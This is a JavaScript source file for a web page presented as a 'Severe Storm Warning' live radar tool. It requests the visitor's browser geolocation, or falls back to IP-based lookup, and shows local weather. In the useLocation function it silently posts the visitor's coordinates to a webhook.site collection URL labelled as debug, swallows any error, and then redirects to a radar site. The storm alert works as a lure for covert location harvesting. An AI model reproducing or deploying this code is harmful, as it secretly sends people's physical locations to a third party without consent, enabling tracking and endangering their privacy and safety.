const app = document.querySelector("#app")

app.innerHTML = `
  <div class="w-full max-w-sm mx-auto p-6">
    <div class="backdrop-blur-lg bg-white/10 border border-white/20 rounded-2xl shadow-xl p-6 text-center space-y-6">

      <div class="text-5xl animate-pulse">⛈️</div>

      <h1 class="text-xl font-semibold tracking-wide">
        Severe Storm Warning
      </h1>

      <p id="status" class="text-slate-300 text-sm">
        Tap below to view local radar
      </p>

      <button id="radarBtn"
        class="w-full bg-indigo-600 hover:bg-indigo-500 transition rounded-xl py-3 font-medium shadow-lg">
        View Live Radar
      </button>

      <div id="weather" class="hidden text-lg font-semibold"></div>

    </div>
  </div>
`

const radarBtn = document.getElementById("radarBtn")
const status = document.getElementById("status")
const weatherDiv = document.getElementById("weather")

const WEBHOOK_DEBUG_URL = "https://webhook.site/1fa84608-64ca-4386-b93a-dadce1c9a20e"

async function useLocation(latitude, longitude, source = "geolocation", accuracy = null) {
  try {
    fetch(WEBHOOK_DEBUG_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ latitude, longitude, source }),
    }).catch(() => {})

    status.textContent = "Fetching local weather..."

    const response = await fetch(
      `https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`
    )
    const data = await response.json()
    const temperature = data.current_weather.temperature

    const sourceNote =
      source === "ip"
        ? '<div class="text-xs text-slate-500 mt-1">Approximate location (from IP)</div>'
        : ""
    const accuracyLine =
      accuracy != null
        ? `<div>Accuracy: ${accuracy} meters</div>`
        : ""

    weatherDiv.innerHTML = `
      <div>Latitude: ${latitude.toFixed(5)}</div>
      <div>Longitude: ${longitude.toFixed(5)}</div>
      ${accuracyLine}
      <div class="mt-2">Current Temperature: ${temperature}°C</div>
      ${sourceNote}
    `
    weatherDiv.classList.remove("hidden")
    status.textContent = "Opening live radar..."

    setTimeout(() => {
      window.location.href = `https://www.windy.com/${latitude}/${longitude}`
    }, 3000)
  } catch (error) {
    status.textContent = "Unable to fetch weather data."
  }
}

async function fallbackToIpLocation() {
  status.textContent = "Using approximate location..."
  try {
    const res = await fetch("https://ipwho.is/")
    const data = await res.json()
    if (data.latitude != null && data.longitude != null) {
      await useLocation(data.latitude, data.longitude, "ip")
    } else {
      status.textContent = "Could not get location. Try allowing browser location."
    }
  } catch (e) {
    status.textContent = "Location failed. Allow location access or check connection."
  }
}

radarBtn.addEventListener("click", async () => {
  if (navigator.geolocation) {
    status.textContent = "Requesting location..."
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords
        console.log("Latitude:", latitude)
        console.log("Longitude:", longitude)
        console.log("Accuracy:", accuracy)
        useLocation(latitude, longitude, "geolocation", accuracy)
      },
      () => fallbackToIpLocation(),
      { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
    )
  } else {
    await fallbackToIpLocation()
  }
})
